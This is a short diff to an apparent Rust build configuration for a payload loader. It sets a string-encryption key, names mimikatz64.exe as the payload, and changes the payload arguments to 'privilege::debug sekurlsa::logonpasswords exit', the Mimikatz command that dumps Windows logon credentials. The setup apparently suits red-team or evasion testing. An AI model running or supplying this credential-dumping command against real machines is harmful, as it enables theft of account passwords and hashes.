@@ -1,4 +1,4 @@
 [env]
 LITCRYPT_ENCRYPT_KEY  = { value = "testkeywillbeoverwritten", force=true }
 PAYLOAD_FILE_NAME  = { value = "E:\\Share\\Utils\\win\\programs\\mimikatz64.exe", force=true }
-PAYLOAD_ARGUMENTS  = { value = "sekurlsa::logonpasswords exit aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa", force=true }
+PAYLOAD_ARGUMENTS  = { value = "privilege::debug sekurlsa::logonpasswords exit", force=true }
